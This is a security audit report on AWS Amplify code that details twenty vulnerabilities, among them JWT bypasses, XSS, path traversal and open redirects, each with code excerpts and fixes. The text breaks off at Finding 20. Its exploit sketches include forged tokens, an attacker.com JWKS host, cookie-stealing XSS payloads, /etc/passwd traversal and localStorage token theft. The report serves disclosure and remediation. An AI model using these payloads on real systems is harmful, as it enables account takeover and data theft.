# AWS Amplify Organization - Security Audit Report
## Injection-Class Vulnerability Analysis

**Date:** 2026-03-02
**Scope:** All repositories in https://github.com/aws-amplify
**Methodology:** Static source code analysis with dataflow tracing
**Repositories analyzed:** amplify-js, amplify-cli, amplify-backend, amplify-category-api, amplify-ui, amplify-codegen, amplify-codegen-ui, amplify-data, discord-bot, maplibre-gl-js-amplify, maplibre-gl-draw-circle

**Exclusions applied:** docs/, test/, tests/, __tests__/, spec/, examples/, demo/, fixtures/, mocks/, vendor/, dist/, build/, coverage/, node_modules/

---

## FINDINGS

---

### [FINDING 1]
**Title:** JWT Decode Without Signature Verification Used for Authorization in AppSync Simulator
**Severity:** Critical
**Reachable via GET?:** No (POST /graphql), but the simulator also exposes unauthenticated GET endpoints
**Endpoint(s):** POST /graphql (AppSync simulator)
**Inputs:** Authorization header (JWT token)

**Source:** `amplify-cli/packages/amplify-appsync-simulator/src/utils/auth-helpers/helpers.ts:36-42`
```typescript
import jwtDecode from 'jwt-decode';

export function extractJwtToken(authorization: string): JWTToken {
  try {
    return jwtDecode(authorization);
  } catch (_) {
    return undefined;
  }
}
```

**Sink:** `amplify-cli/packages/amplify-appsync-simulator/src/server/operations.ts:79-90`
```typescript
const jwt = authorization && extractJwtToken(authorization);
const context: AppSyncGraphQLExecutionContext = {
  jwt,                          // unverified claims used for authorization
  requestAuthorizationMode,
  sourceIp,
  headers: request.headers,
  appsyncErrors: [],
  iamToken,
};
```

**Dataflow summary:**
- Authorization header read from HTTP request
- Passed to `extractJwtToken()` which uses `jwt-decode` (base64 decode only, NO signature verification)
- Unverified claims placed into GraphQL execution context
- Claims used for owner-based authorization (`sub`, `cognito:username`)
- Claims used for group-based authorization (`cognito:groups`)
- Claims used for OIDC issuer validation (`iss`)

**Exploit sketch:**
1. Craft a JWT with arbitrary claims: `{"sub":"admin","cognito:groups":["Admins"],"iss":"https://cognito-idp.us-east-1.amazonaws.com/us-east-1_xxxxx"}`
2. Base64-encode header and payload, add any signature
3. Send POST to simulator's /graphql with this token as Authorization header
4. All @auth rules (owner, group) are bypassed since claims are trusted without verification

**Why it's real:** `jwt-decode` explicitly states it does NOT verify signatures. The unverified `cognito:groups` claim is checked at `amplify-cli/packages/amplify-appsync-simulator/src/schema/directives/auth.ts:54-59` for group authorization, and `sub`/`cognito:username` are used for owner authorization in VTL resolver context.

**Fix guidance:**
- Replace `jwt-decode` with `jose.jwtVerify()` or `aws-jwt-verify`
- Verify JWT signature against Cognito JWKS before trusting claims
- Validate issuer, audience, and expiration

---

### [FINDING 2]
**Title:** JWKS Endpoint Injection via Untrusted Token Payload in Admin Login Server
**Severity:** Critical
**Reachable via GET?:** No (POST /amplifyadmin/)
**Endpoint(s):** POST /amplifyadmin/ on port 4242
**Inputs:** POST body containing `idToken.payload.iss`, `idToken.payload.aud`, `idToken.jwtToken`, `accessToken.jwtToken`

**Source:** `amplify-cli/packages/amplify-provider-awscloudformation/src/utils/admin-login-server.ts:85-97`
```typescript
this.app.post('/amplifyadmin/', async (req, res) => {
  // ...
  await this.storeTokens(req.body, this.appId);
```

**Sink:** `amplify-cli/packages/amplify-provider-awscloudformation/src/utils/admin-login-server.ts:128-133`
```typescript
const issuer: string = tokens.idToken.payload.iss;    // FROM REQUEST BODY
const audience: string = tokens.idToken.payload.aud;  // FROM REQUEST BODY
const N_JWKS = jose.createRemoteJWKSet(new URL(`${issuer}/.well-known/jwks.json`));
const { payload: decodedJwtId } = await jose.jwtVerify(tokens.idToken.jwtToken, N_JWKS, { issuer, audience });
```

**Dataflow summary:**
- Attacker POSTs crafted token payload to `/amplifyadmin/`
- `iss` and `aud` extracted from the token payload (attacker-controlled)
- `iss` used to construct JWKS URL: `${iss}/.well-known/jwks.json`
- Server fetches signing keys from attacker-controlled URL (SSRF)
- JWT verified against attacker's own keys (verification passes)
- Admin credentials stored to local filesystem

**Exploit sketch:**
1. Host a JWKS endpoint at `https://attacker.com/.well-known/jwks.json`
2. Sign a JWT with your own private key, setting `iss: "https://attacker.com"`
3. POST to `http://target:4242/amplifyadmin/` with the crafted tokens
4. Server fetches JWKS from attacker, verifies JWT against attacker's keys
5. Admin credentials stored, granting CLI admin access

**Why it's real:** The issuer is extracted from the untrusted request body, not from a trusted configuration. The JWKS URL is constructed from this attacker-controlled value, creating a self-referential trust loop. Server listens on `0.0.0.0:4242`.

**Fix guidance:**
- Use a hardcoded or configured trusted issuer for JWKS URL construction
- Never derive verification parameters from the token being verified
- Pin the JWKS URL to known Cognito endpoints

---

### [FINDING 3]
**Title:** Authorization Bypass via Missing Return in Express Middleware (Admin Auth)
**Severity:** High
**Reachable via GET?:** Yes - GET /getUser, GET /listUsers, GET /listGroups, GET /listGroupsForUser, GET /listUsersInGroup
**Endpoint(s):** ALL routes in admin-auth-app.js
**Inputs:** Cognito JWT groups claim via API Gateway authorizer

**Source:** `amplify-cli/packages/amplify-category-auth/resources/adminAuth/admin-auth-app.js:47-69`
```javascript
const checkGroup = function (req, res, next) {
  if (req.path == '/signUserOut') {
    return next();
  }
  if (typeof allowedGroup === 'undefined' || allowedGroup === 'NONE') {
    return next();
  }
  if (req.apiGateway.event.requestContext.authorizer.claims['cognito:groups']) {
    const groups = req.apiGateway.event.requestContext.authorizer.claims['cognito:groups'].split(',');
    if (!(allowedGroup && groups.indexOf(allowedGroup) > -1)) {
      const err = new Error('User does not have permissions');
      next(err);       // NO RETURN - falls through!
    }
  } else {
    const err = new Error('User does not have permissions');
    err.statusCode = 403;
    next(err);         // NO RETURN - falls through!
  }
  next();              // ALWAYS CALLED - double next() bug
};
```

**Sink:** Route handlers for addUserToGroup, removeUserFromGroup, disableUser, enableUser, getUser, listUsers, etc.

**Dataflow summary:**
- Request arrives at admin Lambda behind API Gateway
- `checkGroup` middleware runs
- If user NOT in allowed group: `next(err)` called but no `return`
- Execution falls through to `next()` on line 68 (called unconditionally)
- Express processes both: error middleware AND route handler
- Route handler executes Cognito admin operations

**Exploit sketch:**
1. Authenticate to Cognito with a valid user account (any group or no group)
2. Send GET request to `/listUsers` or `/getUser?username=admin`
3. `checkGroup` calls `next(err)` but also calls `next()` (double-next bug)
4. Express may process the route handler, returning user data
5. POST to `/addUserToGroup` with body `{username:"attacker", groupname:"Admins"}`

**Why it's real:** Classic Express.js double-`next()` bug. Lines 61 and 66 call `next(err)` without `return`, then line 68 calls `next()` unconditionally. This is a production Lambda template deployed by `amplify add auth`.

**Fix guidance:**
- Add `return` before `next(err)` on lines 61 and 66
- Or restructure as `if/else if/else` with returns

---

### [FINDING 4]
**Title:** Stored XSS via Geofence ID in MapLibre UI (innerHTML Injection)
**Severity:** High
**Reachable via GET?:** Yes (XSS triggers on page load when geofence list is rendered)
**Endpoint(s):** Client-side map rendering with geofence data from AWS Location Service
**Inputs:** `geofence.geofenceId` from API response

**Source:** `maplibre-gl-js-amplify/src/AmplifyGeofenceControl/index.ts:214-218`
```typescript
const { entries, nextToken } = await Geo.listGeofences();
entries.forEach((geofence) => loadGeofence(geofence));
```

**Sink:** `maplibre-gl-js-amplify/src/AmplifyGeofenceControl/ui.ts:408`
```typescript
geofenceTitle.innerHTML = geofence.geofenceId;
```

Also at line 607:
```typescript
title.innerHTML = `Are you sure you want to delete <strong>${geofenceId}</strong>?`;
```

**Dataflow summary:**
- `Geo.listGeofences()` fetches geofences from AWS Location Service
- Each geofence object includes `geofenceId` (string)
- `renderListItem()` sets `innerHTML` directly to geofenceId (no escaping)
- Validation regex only applied during CREATE, not during LIST/load
- Geofences created via AWS SDK directly (bypassing UI) have no name restrictions

**Exploit sketch:**
1. Attacker with AWS API access calls `PutGeofence` directly via AWS SDK
2. Sets `geofenceId` to `<img src=x onerror=alert(document.cookie)>`
3. Any user loading the geofence control UI triggers the XSS
4. JavaScript executes in user's browser context

**Why it's real:** `innerHTML` is set to unsanitized data from an API response. The `isValidGeofenceId` regex is only applied during `createGeofence()` (line 165), not when loading geofences from the API (line 214).

**Fix guidance:**
- Use `textContent` instead of `innerHTML` for geofenceId
- HTML-escape all API data before DOM insertion
- Apply validation on load, not just on create

---

### [FINDING 5]
**Title:** XSS via Unsanitized GeoJSON Feature Properties in Map Popup HTML
**Severity:** High
**Reachable via GET?:** Yes (triggers on map marker click)
**Endpoint(s):** Client-side map popup rendering
**Inputs:** GeoJSON feature properties (`place_name`, `title`, `address`)

**Source:** `maplibre-gl-js-amplify/src/popupRender.ts:22-35`
```typescript
if (strHasLength(selectedFeature.properties.place_name)) {
  const placeName = selectedFeature.properties.place_name.split(',');
  title = placeName[0];
  address = placeName.splice(1, placeName.length).join(',');
} else if (strHasLength(selectedFeature.properties.title) || ...) {
  title = selectedFeature.properties.title;
  address = selectedFeature.properties.address;
}
```

**Sink:** `maplibre-gl-js-amplify/src/popupRender.ts:37-38`
```typescript
const titleHtml = `<div ...>${title}</div>`;
const addressHtml = `<div ...>${address}</div>`;
```

Then rendered via `maplibre-gl-js-amplify/src/drawUnclusteredLayer.ts:90`:
```typescript
new Popup().setLngLat(coordinates).setHTML(popupRender(selectedFeature)).addTo(map);
```

**Dataflow summary:**
- GeoJSON data loaded into map from user-provided or API-provided source
- Feature properties (`place_name`, `title`, `address`) read directly
- Values interpolated into HTML template strings without escaping
- HTML rendered via maplibre's `Popup.setHTML()` which parses HTML

**Exploit sketch:**
1. Supply GeoJSON data with malicious `place_name`: `<img src=x onerror=alert(1)>,address`
2. When user clicks the map marker, popup renders with `innerHTML`
3. JavaScript executes in user's browser context

**Why it's real:** String template interpolation directly into HTML without any escaping function. `Popup.setHTML()` parses the provided string as HTML.

**Fix guidance:**
- HTML-escape all feature property values before interpolation
- Use `Popup.setText()` or create DOM elements with `textContent`

---

### [FINDING 6]
**Title:** Expired JWT Tokens Accepted as Valid in Next.js Server-Side Adapter
**Severity:** High
**Reachable via GET?:** Yes (affects all server-side rendered pages using Amplify auth)
**Endpoint(s):** All Next.js server-side routes using `runWithAmplifyServerContext`
**Inputs:** Cognito token cookies

**Source:** `amplify-js/packages/adapter-nextjs/src/utils/isValidCognitoToken.ts:16-38`
```typescript
export const isValidCognitoToken = async (input: {
  token: string;
  verifier: JwtVerifier;
}): Promise<boolean> => {
  const { token, verifier } = input;
  try {
    await verifier.verify(token);
    return true;
  } catch (error) {
    if (error instanceof JwtExpiredError) {
      return true;  // EXPIRED TOKENS ACCEPTED
    }
    return false;
  }
};
```

**Sink:** Token validation used for server-side auth decisions in the Next.js adapter

**Dataflow summary:**
- Server reads Cognito tokens from cookies
- Token passed to `isValidCognitoToken()` for validation
- If JWT has valid signature but is expired → `JwtExpiredError` thrown
- Error caught and token treated as valid (`return true`)
- Expired token's claims used for server-side authorization

**Exploit sketch:**
1. Obtain a valid Cognito token (e.g., from a leaked log, backup, or session theft)
2. Wait for token to expire
3. Send requests to the Next.js application with the expired token in cookies
4. Server-side adapter accepts the expired token as valid
5. Access protected resources with stale/revoked session

**Why it's real:** The code explicitly catches `JwtExpiredError` and returns `true`. The comment states "the token should have valid signature but expired. So, we can consider it as a valid token." This bypasses the temporal access control that token expiration provides.

**Fix guidance:**
- Remove the `JwtExpiredError` catch that returns `true`
- Expired tokens should be treated as invalid
- Implement token refresh on the server side if needed

---

### [FINDING 7]
**Title:** DOM-Based Open Redirect in Cognito Custom Verification Page
**Severity:** High
**Reachable via GET?:** Yes (page loaded via URL with `data` query parameter)
**Endpoint(s):** Static verification page served from S3
**Inputs:** `data` URL query parameter (base64-encoded JSON), `code` query parameter

**Source:** `amplify-cli/packages/amplify-category-auth/provider-utils/awscloudformation/triggers/CustomMessage/assets/verify.js:28-32`
```javascript
function confirm() {
  const urlParams = new URLSearchParams(window.location.search);
  const encoded = urlParams.get('data');
  const code = urlParams.get('code');
  const decoded = JSON.parse(atob(encoded));
  const { userName, redirectUrl, clientId, region } = decoded;
```

**Sink:** Same file, lines 45-48:
```javascript
window.location.replace(redirectUrl);
```

**Dataflow summary:**
- User clicks verification link in email
- `data` query parameter is base64-decoded and JSON-parsed
- `redirectUrl` extracted from decoded JSON (attacker-controlled)
- After Cognito `confirmSignUp` succeeds (or returns "already confirmed"), user redirected to `redirectUrl`

**Exploit sketch:**
1. Craft URL: `https://victim-bucket.s3.amazonaws.com/?data=BASE64({redirectUrl:"https://evil.com/phish",...})&code=123456`
2. Send phishing email with this link (or modify legitimate verification email)
3. User clicks link, Cognito confirms sign-up
4. User redirected to attacker's phishing page

**Why it's real:** The `redirectUrl` is read directly from the URL's `data` query parameter without validation. The server-side Lambda sets the redirect URL from an env var, but the client-side code reads it from the URL, allowing override.

**Fix guidance:**
- Validate `redirectUrl` against an allowlist of expected domains
- Use a server-side redirect instead of client-side
- Sign the `data` parameter to prevent tampering

---

### [FINDING 8]
**Title:** Admin Role Authorization Bypass via Substring Match in IAM Auth
**Severity:** High
**Reachable via GET?:** Yes (affects all GraphQL queries/mutations with IAM auth)
**Endpoint(s):** All AppSync GraphQL endpoints using @auth with IAM
**Inputs:** IAM role ARN from request identity

**Source:** `amplify-category-api/packages/amplify-graphql-auth-transformer/src/vtl-generator/ddb/resolvers/helpers.ts:196-206`
```typescript
export const iamAdminRoleCheckExpression = (...): Expression => {
  return compoundExpression([
    forEach(ref('adminRole'), ref('ctx.stash.adminRoles'), [
      iff(
        and([
          methodCall(ref('ctx.identity.userArn.contains'), ref('adminRole')),  // SUBSTRING MATCH
          notEquals(ref('ctx.identity.userArn'), ref('ctx.stash.authRole')),
          notEquals(ref('ctx.identity.userArn'), ref('ctx.stash.unauthRole')),
        ]),
        fullReturnExpression,  // bypasses all auth rules
      ),
    ]),
  ]);
};
```

**Sink:** Generated VTL resolver that runs `#return` (bypasses all subsequent auth logic)

**Dataflow summary:**
- AppSync resolver checks if caller has admin IAM role
- Check uses `userArn.contains(adminRole)` — a substring match
- If admin role name is "Admin", any role ARN containing "Admin" passes
- `#return` immediately returns data, bypassing ALL @auth rules

**Exploit sketch:**
1. Determine the admin role name (e.g., "AmplifyAdmin")
2. Create an IAM role with ARN containing that string (e.g., "NotAmplifyAdminReally")
3. Make authenticated GraphQL request using this role
4. `contains` check passes, `#return` bypasses all @auth rules
5. Full unrestricted access to all data

**Why it's real:** `String.contains()` is a substring match, not an exact match. The generated VTL calls `$ctx.identity.userArn.contains($adminRole)`. Combined with `#return`, this completely bypasses the authorization pipeline.

**Fix guidance:**
- Use exact ARN matching or suffix matching with role name delimiters
- Use `$ctx.identity.userArn.endsWith("/" + $adminRole)` instead of `contains`

---

### [FINDING 9]
**Title:** HTML/JavaScript Injection in OAuth Redirect Intermediary Page
**Severity:** High
**Reachable via GET?:** Yes (triggered during OAuth callback flow)
**Endpoint(s):** GET /api/auth/sign-in-callback, GET /api/auth/sign-out-callback
**Inputs:** `redirectOnSignInComplete` configuration (developer-set, but no escaping)

**Source:** `amplify-js/packages/adapter-nextjs/src/auth/utils/createRedirectionIntermediary.ts:14-25`
```typescript
const createHTML = (redirectTarget: string) => `
<!DOCTYPE html>
  <html>
  <head>
      <title>Redirecting...</title>
      <meta http-equiv="refresh" content="0; URL='${redirectTarget}'" />
      <script>window.location.replace("${redirectTarget}")</script>
  </head>
  <body>
      <p>If you are not redirected automatically, follow this <a href="${redirectTarget}">link</a>.</p>
  </body>
</html>`;
```

**Sink:** Response body served as `text/html` during auth callback

**Dataflow summary:**
- `redirectTarget` interpolated into HTML without escaping
- Appears in 3 injection contexts: `<meta>` tag, `<script>` block, `<a href>`
- Value comes from `handlerInput.redirectOnSignInComplete` (developer config)
- No HTML encoding, JavaScript escaping, or URL validation applied

**Exploit sketch:**
- If config is sourced from env var: `REDIRECT_URL='");alert(document.cookie);//'`
- The `<script>` tag becomes: `window.location.replace("");alert(document.cookie);//")`
- JavaScript executes in the auth callback page context (has access to fresh tokens)
- Even with developer-controlled values, `"` in the path would break the JS context

**Why it's real:** Three different injection contexts (meta attribute, JavaScript string, HTML attribute) with zero escaping. Defense-in-depth failure even if the value is typically developer-controlled.

**Fix guidance:**
- HTML-encode the value for meta/href contexts
- JSON-serialize for the JavaScript context
- Validate as a relative URL path

---

### [FINDING 10]
**Title:** VTL Template Injection in DynamoDB Expression Values
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries)
**Endpoint(s):** All AppSync GraphQL endpoints with @model + composite sort keys
**Inputs:** GraphQL query arguments for sort key conditions

**Source:** `amplify-category-api/packages/graphql-transformer-common/src/dynamodbUtils.ts:282-290`
```typescript
set(ref(accumulatorVar1), str(`$ctx.args.${sortKeyArgumentName}.beginsWith.${keyName}`))
// ...
qref(`$${queryExprReference}.expressionValues.put(":sortKey", { "S": "$${accumulatorVar1}" })`)
```

**Sink:** DynamoDB expression value construction in VTL resolver

**Dataflow summary:**
- User-supplied GraphQL argument accessed via `$ctx.args`
- Value placed inside VTL double-quoted string via `str()` function
- VTL evaluates `$` references inside double-quoted strings
- User input containing `$` followed by valid VTL references gets evaluated

**Exploit sketch:**
1. Send GraphQL query with sort key argument: `{ beginsWith: { field1: "$ctx.identity.claims" } }`
2. VTL evaluates `$ctx.identity.claims` within the string context
3. Identity claims data leaks into the DynamoDB expression value
4. Claims may appear in error messages or be stored in DynamoDB

**Why it's real:** VTL's `#set($x = "...")` evaluates `$references` inside double-quoted strings. The `str()` function generates exactly this pattern. User input from `$ctx.args` is placed into these strings without escaping `$` characters.

**Fix guidance:**
- Use single-quoted strings in VTL (which don't evaluate references)
- Escape `$` characters in user input before VTL string interpolation
- Use `$util.escapeJavaScript()` on user input

---

### [FINDING 11]
**Title:** OpenSearch Injection via Aggregation Field/Type Parameters
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries with @searchable)
**Endpoint(s):** AppSync GraphQL endpoints with @searchable directive
**Inputs:** GraphQL aggregation arguments (`field`, `type`, `name`)

**Source:** `amplify-category-api/packages/amplify-graphql-searchable-transformer/src/generate-resolver-vtl.ts:208-214`
```typescript
qref('$aggItemType.put("$aggItem.type", { "field": "$aggItem.field" })'),
qref('$aggItemType.put("$aggItem.type", { "field": "${aggItem.field}.keyword" })'),
qref('$aggsValue.put("$aggItem.name", $aggItemType)'),
```

**Sink:** OpenSearch query body construction

**Dataflow summary:**
- User provides aggregation arguments via GraphQL
- `$aggItem.type`, `$aggItem.field`, `$aggItem.name` directly interpolated
- Values placed into JSON-like strings building the OpenSearch query body
- No escaping or validation of these values

**Exploit sketch:**
1. Send GraphQL query with aggregation: `{ field: "name\",\"script\":{\"source\":\"...", type: "terms", name: "exploit" }`
2. VTL interpolates the value, potentially injecting into OpenSearch query structure
3. If OpenSearch scripting is enabled, could lead to RCE

**Why it's real:** `$aggItem.type` and `$aggItem.name` are NOT validated (only `$aggItem.field` has an `allowedAggFields` check). These values are interpolated directly into the OpenSearch query body.

**Fix guidance:**
- Validate `type` against an enum (terms, avg, max, min, sum, cardinality)
- Validate `name` against an alphanumeric pattern
- Use `$util.escapeJavaScript()` on all user-supplied values in JSON construction

---

### [FINDING 12]
**Title:** OpenSearch Injection via base64-decoded nextToken Pagination
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries with @searchable)
**Endpoint(s):** AppSync GraphQL endpoints with @searchable directive
**Inputs:** `nextToken` GraphQL argument

**Source:** `amplify-category-api/packages/amplify-graphql-searchable-transformer/src/generate-resolver-vtl.ts:192`
```typescript
search_after: ref('util.base64Decode($args.nextToken)'),
```

**Sink:** `amplify-category-api/packages/graphql-mapping-template/src/searchable.ts:57-64`
```typescript
body: raw(`{
  #if( $context.args.nextToken )"search_after": ${print(search_after)}, #end
  ...
  "query": ${print(query)},
  "aggs": ${print(aggs)}
}`),
```

**Dataflow summary:**
- User provides `nextToken` as a GraphQL argument (base64-encoded string)
- `$util.base64Decode()` decodes it to raw JSON
- Decoded content placed directly into the OpenSearch query body as `search_after` value
- No validation of the decoded content

**Exploit sketch:**
1. Craft malicious base64 payload: `btoa('[1], "script_fields":{"x":{"script":{"source":"malicious"}}}')`
2. Send as `nextToken` in GraphQL query
3. Decoded payload injected into OpenSearch query body
4. Could modify query behavior or enable script execution

**Why it's real:** `$util.base64Decode()` returns arbitrary string content that is interpolated directly into the JSON query body. No JSON structure validation is performed.

**Fix guidance:**
- Validate decoded nextToken as a valid JSON array of scalars
- Sign the nextToken on the server side to prevent tampering
- Use `$util.parseJson()` and re-serialize to prevent injection

---

### [FINDING 13]
**Title:** Path Traversal in S3 Storage Simulator (Read/Write/Delete)
**Severity:** High
**Reachable via GET?:** Yes (GET for read, PUT for write, DELETE for delete)
**Endpoint(s):** GET/PUT/DELETE /* on local simulator
**Inputs:** URL path (mapped to filesystem path)

**Source:** `amplify-cli/packages/amplify-storage-simulator/src/server/S3server.ts:128`
```typescript
const filePath = path.normalize(path.join(this.localDirectoryPath, request.params.path));
if (fs.existsSync(filePath) && !fs.statSync(filePath).isDirectory()) {
  fs.readFile(filePath, (err, data) => {
    response.send(data);
  });
}
```

**Sink:** `fs.readFile()` at line 130, `fs.writeFileSync()` at line 251, `fs.unlink()` at line 232

**Dataflow summary:**
- URL path extracted from request
- `decodeURIComponent()` applied (utils.ts)
- `path.join(localDirectory, userPath)` constructs filesystem path
- `path.normalize()` applied but insufficient for all traversal vectors
- No authentication on any endpoint

**Exploit sketch:**
1. `GET /bucket/..%2f..%2f..%2fetc/passwd` — after `decodeURIComponent`, becomes `../../../etc/passwd`
2. `path.join('/localdir', '../../../etc/passwd')` → `/etc/passwd`
3. Server reads and returns file contents
4. `PUT` with same path writes arbitrary files to filesystem

**Why it's real:** `path.join()` resolves `..` segments. While `path.normalize()` canonicalizes the path, it does not prevent traversal above the base directory. No check verifies the resolved path is within `localDirectoryPath`. No authentication required.

**Fix guidance:**
- After `path.join` and `path.normalize`, verify resolved path starts with `localDirectoryPath`
- Use `path.resolve()` and check with `resolvedPath.startsWith(baseDir)`
- Add at minimum a check that `!resolvedPath.includes('..')`

---

### [FINDING 14]
**Title:** Open Redirect in Discord Bot Guild Switching
**Severity:** Medium
**Reachable via GET?:** No (POST only), but CSRF-triggerable via form submission
**Endpoint(s):** POST /api/switch-guild
**Inputs:** `redirect` form data field

**Source:** `discord-bot/apps/discord-bot-frontend/src/routes/api/switch-guild/+server.ts:9-11`
```typescript
const data = await request.formData()
guildId = data.get('guild') as string
redirect = (data.get('redirect') as string) || '/'
```

**Sink:** Same file, line 29:
```typescript
headers.set('Location', redirect)
return new Response('ok', { headers, status: 307 })
```

**Dataflow summary:**
- `redirect` read from POST form data (user-controlled)
- No URL validation or allowlist check
- Set directly as HTTP `Location` header with 307 status

**Exploit sketch:**
1. Create a hidden HTML form targeting `/api/switch-guild`
2. Include `<input name="redirect" value="https://evil.com">`
3. Auto-submit via JavaScript
4. User redirected to attacker's page

**Why it's real:** The `redirect` value flows directly from form data to the `Location` header without any validation. The `guildId !== locals.guildId` condition is easily met.

**Fix guidance:**
- Validate `redirect` is a relative path (starts with `/`)
- Or validate against an allowlist of known paths
- Never accept absolute URLs from user input for redirects

---

### [FINDING 15]
**Title:** Wildcard CORS on Admin Cognito Management API
**Severity:** Medium
**Reachable via GET?:** Yes (GET endpoints: /getUser, /listUsers, /listGroups, etc.)
**Endpoint(s):** All routes in admin-auth-app.js
**Inputs:** Any cross-origin request

**Source:** `amplify-cli/packages/amplify-category-auth/resources/adminAuth/admin-auth-app.js:38-41`
```javascript
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});
```

**Sink:** All administrative Cognito endpoints (add/remove users from groups, disable/enable users, list users)

**Dataflow summary:**
- `Access-Control-Allow-Origin: *` set for ALL requests
- Allows any website to make cross-origin requests to admin API
- Combined with the `checkGroup` bypass (Finding 3), enables CSRF-like attacks

**Why it's real:** Wildcard CORS allows any origin to send requests. While API Gateway Cognito authorizer adds a layer, the CORS header enables cross-origin JavaScript to interact with these endpoints when credentials are available (e.g., cookies).

**Fix guidance:**
- Set `Access-Control-Allow-Origin` to the specific application domain
- Add `Access-Control-Allow-Credentials: true` only if needed
- Use a CORS allowlist

---

### [FINDING 16]
**Title:** All Auth Tokens Stored in localStorage by Default (XSS Token Theft)
**Severity:** High
**Reachable via GET?:** Yes (any XSS vector on the application)
**Endpoint(s):** Client-side — all pages
**Inputs:** N/A (architectural issue)

**Source:** `amplify-js/packages/core/src/storage/DefaultStorage.ts:10-14`
```typescript
export class DefaultStorage extends KeyValueStorage {
  constructor() {
    super(getLocalStorageWithFallback());
  }
}
```

Token keys follow predictable pattern at `amplify-js/packages/auth/src/providers/cognito/tokenProvider/types.ts:28-39`:
```
CognitoIdentityServiceProvider.<clientId>.<username>.accessToken
CognitoIdentityServiceProvider.<clientId>.<username>.idToken
CognitoIdentityServiceProvider.<clientId>.<username>.refreshToken
```

**Sink:** Any XSS vulnerability enables `localStorage.getItem()` to steal all tokens

**Dataflow summary:**
- Default token storage is `localStorage` (accessible to all JavaScript on the page)
- Access tokens, ID tokens, AND refresh tokens stored
- PKCE verifier and OAuth state also stored in localStorage
- Predictable key names enable targeted exfiltration

**Exploit sketch:**
1. Find any XSS in the application (e.g., via Findings 4, 5)
2. `document.cookie` won't have tokens (they're in localStorage)
3. `Object.keys(localStorage).filter(k => k.includes('CognitoIdentityServiceProvider'))`
4. Exfiltrate all tokens including refresh token
5. Use refresh token for persistent access (survives token expiration)

**Why it's real:** This is the default configuration. Refresh tokens in localStorage enable persistent session hijacking from a single XSS. The `CookieStorage` alternative still lacks `httpOnly` (client-side js-cookie library cannot set it).

**Fix guidance:**
- Default to `CookieStorage` with `secure: true` and `sameSite: 'strict'`
- For SSR apps, use the adapter-nextjs which correctly sets `httpOnly` cookies
- Document the security implications of the default storage

---

### [FINDING 17]
**Title:** Error Message HTML Injection in Geofence Control
**Severity:** Medium
**Reachable via GET?:** Yes (triggers on UI interaction)
**Endpoint(s):** Client-side geofence management UI
**Inputs:** Error messages from API responses

**Source:** `maplibre-gl-js-amplify/src/AmplifyGeofenceControl/ui.ts:547-568`
```typescript
function createAddGeofencePromptError(error: string): void {
  // ...
  errorText.innerHTML = error;
}
```

**Sink:** `innerHTML` assignment with error string

**Dataflow summary:**
- Error from AWS API or application logic passed as string
- Set directly as `innerHTML` without escaping
- If error message contains HTML, it will be rendered

**Why it's real:** `innerHTML` renders HTML from the error string. AWS API error messages could contain user-controlled data (e.g., invalid geofence name echoed in error).

**Fix guidance:**
- Use `textContent` instead of `innerHTML`

---

### [FINDING 18]
**Title:** OAuth State/PKCE in localStorage Enables CSRF Bypass via XSS
**Severity:** Medium
**Reachable via GET?:** Yes (exploitable via XSS during OAuth flow)
**Endpoint(s):** Client-side OAuth flow
**Inputs:** OAuth state and PKCE verifier from localStorage

**Source:** `amplify-js/packages/auth/src/providers/cognito/utils/signInWithRedirectStore.ts:62-70`
```typescript
storeOAuthState(state: string): Promise<void> {
  const authKeys = createKeysForAuthStorage(name, this.cognitoConfig.userPoolClientId);
  return this.keyValueStorage.setItem(authKeys.oauthState, state);
}
```

**Sink:** `amplify-js/packages/auth/src/providers/cognito/utils/oauth/validateState.ts:15-30`
```typescript
const savedState = await oAuthStore.loadOAuthState();
const validatedState = state === savedState ? savedState : undefined;
```

**Dataflow summary:**
- OAuth state parameter stored in localStorage
- PKCE code verifier also stored in localStorage
- XSS attacker can read both values
- Attacker can complete OAuth flow or forge CSRF attacks

**Why it's real:** OAuth state is the primary CSRF protection for the auth flow. If an XSS attacker can read it, they can bypass CSRF protection and complete the OAuth flow to get tokens for the victim.

**Fix guidance:**
- Store OAuth state in `sessionStorage` (slightly better - not shared across tabs)
- Prefer the server-side adapter-nextjs approach using `httpOnly` cookies
- Consider using Web Crypto API for state storage

---

### [FINDING 19]
**Title:** HTTP Transformer URL Path Parameter Injection (SSRF)
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries using @http directive)
**Endpoint(s):** AppSync GraphQL endpoints with @http directive
**Inputs:** GraphQL path parameters (`params`)

**Source:** `amplify-category-api/packages/amplify-graphql-http-transformer/src/graphql-http-transformer.ts:131-133`
```typescript
args.path = args.path.replace(/:\w+/g, (s: string) => {
  return `\$\{ctx.args.params.${s.replace(':', '')}\}`;
});
```

**Sink:** Generated VTL resolver that makes HTTP request to the configured data source with interpolated path

**Dataflow summary:**
- Developer defines `@http(url: "https://api.example.com/users/:userId")`
- Transformer replaces `:userId` with `${ctx.args.params.userId}`
- User-supplied GraphQL argument directly interpolated into HTTP request path
- AppSync makes server-side HTTP request to the target URL

**Exploit sketch:**
1. GraphQL schema: `getUser(params: { userId: String! }): JSON @http(url: "https://api.example.com/users/:userId")`
2. Attacker queries: `getUser(params: { userId: "../admin/secrets" })`
3. AppSync makes request to: `https://api.example.com/users/../admin/secrets`
4. Path traversal on the downstream API

**Why it's real:** User-supplied path parameters are interpolated directly into the HTTP request URL path. AppSync may URL-encode individual segments but does not prevent path traversal with `..`.

**Fix guidance:**
- URL-encode path parameters in the VTL resolver
- Validate path parameters don't contain `..` or `/`

---

### [FINDING 20]
**Title:** IAM Signing Silently Bypassed by Authorization Header Presence
**Severity:** Medium
**Reachable via GET?:** Yes (affects REST API calls)
**Endpoint(s):** All REST API calls from amplify-js
**Inputs:** `Authorization` header in request options

**Source:** `amplify-js/packages/api-rest/src/utils/isIamAuthApplicable.ts:40-44`
```typescript
export const isIamAuthApplicableForRest = (
  { headers }: HttpRequest,
  signingServiceInfo?: SigningServiceInfo,
) => !headers.authorization && !!signingServiceInfo;
```

**Sink:** `amplify-js/packages/api-rest/src/apis/common/transferHandler.ts:113-118`
```typescript
if (isIamAuthApplicable && credentials) {
  response = await authenticatedHandler(request, { ... });
} else {
  response = await unauthenticatedHandler(request, { ... });  // UNSIGNED
}
```

**Dataflow summary:**
